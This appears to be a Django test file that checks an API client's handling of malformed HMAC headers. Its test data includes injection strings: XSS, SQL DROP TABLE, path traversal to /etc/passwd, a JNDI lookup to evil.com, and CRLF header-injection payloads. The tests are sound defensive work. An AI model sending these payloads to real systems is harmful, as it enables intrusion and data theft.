"""
🔐 HMAC Malformed Header Edge Case Tests

Comprehensive tests for malformed HMAC header handling:
- Invalid header formats
- Missing required headers
- Header injection attempts
- Encoding/decoding edge cases
- Boundary value testing
- Protocol violation handling
- Malicious header crafting

These tests ensure HMAC authentication handles all possible
malformed input gracefully and securely without information leakage.
"""

import base64
import json
import time
from unittest.mock import patch, Mock
from typing import Dict, List, Optional, Any

from django.test import SimpleTestCase, override_settings

from apps.api_client.services import PlatformAPIClient


class HMACMalformedHeaderTestCase(SimpleTestCase):
    """🔐 Malformed HMAC header handling tests"""

    def setUp(self):
        """Set up malformed header test environment"""
        self.test_secret = "malformed-header-test-secret-key"
        self.portal_id = "malformed-header-test-portal"

    def _create_mock_platform(self, expected_behavior: str = 'reject_malformed') -> Any:
        """Create mock Platform with specific malformed header behavior"""

        def mock_platform_request(*args, **kwargs):
            headers = kwargs.get('headers', {})

            mock_response = Mock()

            if expected_behavior == 'reject_malformed':
                # Check for required headers
                required_headers = ['X-Portal-Id', 'X-Signature', 'X-Nonce', 'X-Timestamp', 'X-Body-Hash']
                missing_headers = [h for h in required_headers if not headers.get(h)]

                if missing_headers:
                    mock_response.status_code = 400
                    mock_response.json.return_value = {
                        'error': 'Missing required HMAC headers',
                        'missing_headers': missing_headers
                    }
                    return mock_response

                # Check header format validity
                signature = headers.get('X-Signature', '')
                if signature and (len(signature) != 64 or not all(c in '0123456789abcdef' for c in signature.lower())):
                    mock_response.status_code = 400
                    mock_response.json.return_value = {'error': 'Invalid signature format'}
                    return mock_response

                # Check timestamp format
                timestamp = headers.get('X-Timestamp', '')
                if timestamp:
                    try:
                        float(timestamp)
                    except (ValueError, TypeError):
                        mock_response.status_code = 400
                        mock_response.json.return_value = {'error': 'Invalid timestamp format'}
                        return mock_response

                # If all headers present and valid format, accept
                mock_response.status_code = 200
                mock_response.json.return_value = {'success': True, 'authenticated': True}

            elif expected_behavior == 'accept_all':
                # Accept everything (for testing client behavior)
                mock_response.status_code = 200
                mock_response.json.return_value = {'success': True}

            return mock_response

        return mock_platform_request

    def test_missing_required_headers(self):
        """🔐 Test handling of missing required HMAC headers"""

        missing_header_scenarios = [
            ('X-Portal-Id', 'Missing Portal ID header'),
            ('X-Signature', 'Missing HMAC signature header'),
            ('X-Nonce', 'Missing nonce header'),
            ('X-Timestamp', 'Missing timestamp header'),
            ('X-Body-Hash', 'Missing body hash header'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id,
            PLATFORM_API_BASE_URL="http://localhost:8000"
        ):
            client = PlatformAPIClient()

            for missing_header, description in missing_header_scenarios:
                with self.subTest(missing_header=missing_header):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        # Generate normal headers then remove one
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': 'a' * 64,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }

                        # Remove the specific header
                        if missing_header in headers:
                            del headers[missing_header]

                        mock_headers.return_value = headers

                        with patch('requests.request', side_effect=self._create_mock_platform('reject_malformed')):
                            result = client.authenticate_customer('test@example.com', 'password123')

                            # Should fail gracefully
                            self.assertIsNone(result, f"Should fail when {missing_header} is missing")

    def test_malformed_signature_formats(self):
        """🔐 Test handling of various malformed signature formats"""

        malformed_signatures = [
            ('', 'Empty signature'),
            ('short', 'Too short signature'),
            ('a' * 63, 'One character too short'),
            ('a' * 65, 'One character too long'),
            ('G' * 64, 'Invalid hex characters'),
            ('123xyz789' * 7 + '1234567', 'Mixed invalid characters'),
            ('ABCDEF' * 10 + 'GHIJ', 'Uppercase with invalid chars'),
            ('0x' + 'a' * 62, 'Hex prefix included'),
            ('a' * 32 + '\n' + 'b' * 31, 'Contains newline'),
            ('a' * 32 + ' ' + 'b' * 31, 'Contains space'),
            ('あいうえお' * 12 + 'かき', 'Non-ASCII characters'),
            ('\\x41' * 16, 'Escaped hex sequences'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            for malformed_sig, description in malformed_signatures:
                with self.subTest(signature=description):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': malformed_sig,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                        mock_headers.return_value = headers

                        with patch('requests.request', side_effect=self._create_mock_platform('reject_malformed')):
                            result = client.authenticate_customer('test@example.com', 'password123')

                            # Should fail for malformed signatures
                            if malformed_sig == 'a' * 64:  # This one is actually valid format
                                pass  # Valid format should be handled normally
                            else:
                                self.assertIsNone(result, f"Should fail for malformed signature: {description}")

    def test_malformed_timestamp_formats(self):
        """🔐 Test handling of various malformed timestamp formats"""

        malformed_timestamps = [
            ('', 'Empty timestamp'),
            ('not_a_number', 'Non-numeric timestamp'),
            ('123.456.789', 'Multiple decimal points'),
            ('123abc', 'Mixed alphanumeric'),
            ('∞', 'Infinity symbol'),
            ('NaN', 'Not a Number string'),
            ('1.7976931348623157e+308', 'Overflow float'),
            ('-1234567890', 'Negative timestamp'),
            ('0', 'Zero timestamp'),
            ('123\n456', 'Newline in timestamp'),
            ('123 456', 'Space in timestamp'),
            ('123.', 'Trailing decimal point'),
            ('.123', 'Leading decimal point only'),
            ('++123', 'Multiple plus signs'),
            ('--123', 'Multiple minus signs'),
            ('1e999', 'Scientific notation overflow'),
            ('0x123', 'Hexadecimal format'),
            ('123.456e', 'Incomplete scientific notation'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            for malformed_ts, description in malformed_timestamps:
                with self.subTest(timestamp=description):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': 'a' * 64,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': malformed_ts,
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                        mock_headers.return_value = headers

                        with patch('requests.request', side_effect=self._create_mock_platform('reject_malformed')):
                            result = client.authenticate_customer('test@example.com', 'password123')

                            # Should fail for malformed timestamps
                            self.assertIsNone(result, f"Should fail for malformed timestamp: {description}")

    def test_malformed_nonce_formats(self):
        """🔐 Test handling of various malformed nonce formats"""

        malformed_nonces = [
            ('', 'Empty nonce'),
            ('a', 'Single character nonce'),
            ('a' * 1000, 'Extremely long nonce'),
            ('nonce\nwith\nnewlines', 'Multi-line nonce'),
            ('nonce\twith\ttabs', 'Nonce with tabs'),
            ('nonce with spaces', 'Nonce with spaces'),
            ('🔥💥🚀', 'Emoji nonce'),
            ('\x00\x01\x02\x03', 'Control character nonce'),
            ('\\n\\t\\r', 'Escaped sequences'),
            ('<?xml version="1.0"?>', 'XML injection attempt'),
            ('<script>alert(1)</script>', 'Script injection attempt'),
            ('DROP TABLE users;', 'SQL injection attempt'),
            ('../../etc/passwd', 'Path traversal attempt'),
            ('${jndi:ldap://evil.com/}', 'JNDI injection attempt'),
            ('eval(base64_decode("..."))', 'Code injection attempt'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            for malformed_nonce, description in malformed_nonces:
                with self.subTest(nonce=description):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': 'a' * 64,
                            'X-Nonce': malformed_nonce,
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                        mock_headers.return_value = headers

                        with patch('requests.request', side_effect=self._create_mock_platform('accept_all')):
                            # Test that client can generate requests with various nonces
                            # Platform validation would typically reject malicious ones
                            try:
                                result = client.authenticate_customer('test@example.com', 'password123')
                                # Should not crash - graceful handling expected
                            except Exception as e:
                                # Any exception should be handled gracefully
                                self.fail(f"Client should handle malformed nonce gracefully: {description}, Error: {e}")

    def test_malformed_portal_id_formats(self):
        """🔐 Test handling of various malformed Portal ID formats"""

        malformed_portal_ids = [
            ('', 'Empty Portal ID'),
            ('a' * 500, 'Extremely long Portal ID'),
            ('portal\nid', 'Multi-line Portal ID'),
            ('portal\tid', 'Portal ID with tabs'),
            ('portal id', 'Portal ID with spaces'),
            ('portal/id', 'Portal ID with slash'),
            ('portal\\id', 'Portal ID with backslash'),
            ('portal"id', 'Portal ID with quotes'),
            ("portal'id", 'Portal ID with single quotes'),
            ('portal;id', 'Portal ID with semicolon'),
            ('portal|id', 'Portal ID with pipe'),
            ('portal&id', 'Portal ID with ampersand'),
            ('portal<id>', 'Portal ID with angle brackets'),
            ('admin', 'Privileged Portal ID attempt'),
            ('root', 'System Portal ID attempt'),
            ('system', 'System Portal ID attempt'),
            ('*', 'Wildcard Portal ID'),
            ('..', 'Directory traversal Portal ID'),
            ('NULL', 'Null string Portal ID'),
            ('undefined', 'Undefined string Portal ID'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id  # Use legitimate Portal ID in client
        ):
            client = PlatformAPIClient()

            for malformed_portal_id, description in malformed_portal_ids:
                with self.subTest(portal_id=description):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': malformed_portal_id,  # Override with malformed ID
                            'X-Signature': 'a' * 64,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                        mock_headers.return_value = headers

                        def mock_portal_id_validation(*args, **kwargs):
                            headers = kwargs.get('headers', {})
                            portal_id = headers.get('X-Portal-Id', '')

                            mock_response = Mock()
                            # Only accept legitimate portal ID
                            if portal_id == self.portal_id:
                                mock_response.status_code = 200
                                mock_response.json.return_value = {'success': True}
                            else:
                                mock_response.status_code = 401
                                mock_response.json.return_value = {
                                    'error': 'Unauthorized portal',
                                    'portal_id_received': portal_id[:50]  # Truncate for safety
                                }
                            return mock_response

                        with patch('requests.request', side_effect=mock_portal_id_validation):
                            result = client.authenticate_customer('test@example.com', 'password123')

                            # Should fail for all malformed Portal IDs
                            self.assertIsNone(result, f"Should fail for malformed Portal ID: {description}")

    def test_header_injection_attacks(self):
        """🔐 Test resistance to HTTP header injection attacks"""

        header_injection_payloads = [
            ('X-Signature', 'valid_sig\r\nX-Injected: malicious'),
            ('X-Nonce', 'nonce\r\nHost: evil.com'),
            ('X-Timestamp', '123456789\r\nAuthorization: Bearer stolen_token'),
            ('X-Portal-Id', 'portal\r\nX-Real-IP: 127.0.0.1'),
            ('X-Body-Hash', 'hash\r\nContent-Length: 0'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            for header_name, injection_payload in header_injection_payloads:
                with self.subTest(header=header_name):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': 'a' * 64,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }

                        # Inject malicious payload
                        headers[header_name] = injection_payload
                        mock_headers.return_value = headers

                        def mock_injection_detection(*args, **kwargs):
                            headers = kwargs.get('headers', {})

                            # Check for CRLF injection
                            for header_value in headers.values():
                                if isinstance(header_value, str) and ('\r' in header_value or '\n' in header_value):
                                    mock_response = Mock()
                                    mock_response.status_code = 400
                                    mock_response.json.return_value = {
                                        'error': 'Invalid header format detected'
                                    }
                                    return mock_response

                            # Normal response if no injection detected
                            mock_response = Mock()
                            mock_response.status_code = 200
                            mock_response.json.return_value = {'success': True}
                            return mock_response

                        with patch('requests.request', side_effect=mock_injection_detection):
                            result = client.authenticate_customer('test@example.com', 'password123')

                            # Should fail for header injection attempts
                            self.assertIsNone(result,
                                             f"Should fail for header injection in {header_name}")

    def test_encoding_edge_cases(self):
        """🔐 Test handling of various encoding edge cases in headers"""

        encoding_test_cases = [
            ('X-Signature', 'YWJjZGVmZ2hpams=', 'Base64 encoded signature'),
            ('X-Nonce', '%2Ftest%2Fnonce', 'URL encoded nonce'),
            ('X-Portal-Id', 'portal%20id', 'URL encoded Portal ID'),
            ('X-Timestamp', '123%2E456', 'URL encoded timestamp'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            for header_name, encoded_value, description in encoding_test_cases:
                with self.subTest(encoding=description):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': 'a' * 64,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }

                        # Override with encoded value
                        headers[header_name] = encoded_value
                        mock_headers.return_value = headers

                        with patch('requests.request', side_effect=self._create_mock_platform('reject_malformed')):
                            result = client.authenticate_customer('test@example.com', 'password123')

                            # Should handle encoded values appropriately
                            # Most should fail validation unless they decode to valid values
                            if header_name == 'X-Portal-Id' and encoded_value == 'portal%20id':
                                # URL encoded space should fail Portal ID validation
                                self.assertIsNone(result, "URL encoded Portal ID should fail")

    def test_boundary_value_header_lengths(self):
        """🔐 Test handling of boundary value header lengths"""

        boundary_test_cases = [
            # Very short values
            ('X-Signature', 'a', 'Single char signature'),
            ('X-Nonce', '', 'Empty nonce'),
            ('X-Portal-Id', 'a', 'Single char portal ID'),

            # Exactly at common limits
            ('X-Signature', 'a' * 64, 'Exact 64 char signature'),
            ('X-Nonce', 'a' * 43, 'Base64 URL-safe length nonce'),
            ('X-Portal-Id', 'a' * 50, '50 char portal ID'),

            # Very long values
            ('X-Signature', 'a' * 1000, '1000 char signature'),
            ('X-Nonce', 'a' * 1000, '1000 char nonce'),
            ('X-Portal-Id', 'a' * 1000, '1000 char portal ID'),
            ('X-Timestamp', '1' * 100, '100 digit timestamp'),
            ('X-Body-Hash', 'a' * 1000, '1000 char body hash'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            for header_name, header_value, description in boundary_test_cases:
                with self.subTest(boundary=description):
                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': 'a' * 64,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }

                        # Override with boundary value
                        headers[header_name] = header_value
                        mock_headers.return_value = headers

                        def mock_length_validation(*args, **kwargs):
                            headers = kwargs.get('headers', {})

                            # Simulate reasonable header length limits
                            for name, value in headers.items():
                                if isinstance(value, str) and len(value) > 500:
                                    mock_response = Mock()
                                    mock_response.status_code = 400
                                    mock_response.json.return_value = {
                                        'error': f'Header {name} too long: {len(value)} characters'
                                    }
                                    return mock_response

                            # Normal validation after length check
                            return self._create_mock_platform('reject_malformed')(*args, **kwargs)

                        with patch('requests.request', side_effect=mock_length_validation):
                            try:
                                result = client.authenticate_customer('test@example.com', 'password123')
                                # Should handle boundary values gracefully
                            except Exception as e:
                                self.fail(f"Should handle boundary value gracefully: {description}, Error: {e}")

    def test_duplicate_header_handling(self):
        """🔐 Test handling of duplicate HMAC headers"""

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            # Test duplicate headers (this would typically be handled at HTTP level)
            # Most HTTP libraries merge or use the last value for duplicate headers
            with patch.object(client, '_generate_hmac_headers') as mock_headers:
                # Simulate duplicate header scenario
                headers = {
                    'X-Portal-Id': self.portal_id,
                    'X-Signature': 'a' * 64,
                    'X-Nonce': 'test_nonce',
                    'X-Timestamp': str(time.time()),
                    'X-Body-Hash': 'test_body_hash',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                mock_headers.return_value = headers

                def mock_duplicate_detection(*args, **kwargs):
                    # In reality, requests library would handle duplicate headers
                    # Platform would receive final merged/chosen header value
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'success': True}
                    return mock_response

                with patch('requests.request', side_effect=mock_duplicate_detection):
                    result = client.authenticate_customer('test@example.com', 'password123')

                    # Should handle normally (HTTP library resolves duplicates)
                    self.assertIsNotNone(result, "Should handle duplicate headers normally")

    def test_case_sensitivity_edge_cases(self):
        """🔐 Test header name case sensitivity handling"""

        case_variations = [
            ('x-portal-id', 'Lowercase header name'),
            ('X-PORTAL-ID', 'Uppercase header name'),
            ('X-Portal-Id', 'Mixed case header name'),
            ('x-SiGnAtUrE', 'Random case signature header'),
            ('X-NONCE', 'Uppercase nonce header'),
        ]

        with override_settings(
            PLATFORM_API_SECRET=self.test_secret,
            PORTAL_ID=self.portal_id
        ):
            client = PlatformAPIClient()

            for header_variant, description in case_variations:
                with self.subTest(case=description):
                    # HTTP headers are case-insensitive per RFC 7230
                    # This test ensures consistent handling
                    normal_result = None

                    with patch.object(client, '_generate_hmac_headers') as mock_headers:
                        headers = {
                            'X-Portal-Id': self.portal_id,
                            'X-Signature': 'a' * 64,
                            'X-Nonce': 'test_nonce',
                            'X-Timestamp': str(time.time()),
                            'X-Body-Hash': 'test_body_hash',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                        mock_headers.return_value = headers

                        with patch('requests.request', side_effect=self._create_mock_platform('accept_all')):
                            normal_result = client.authenticate_customer('test@example.com', 'password123')

                    # Should work normally regardless of header case
                    # (HTTP libraries typically normalize header names)
                    self.assertIsNotNone(normal_result,
                                        "Should handle header case variations normally")
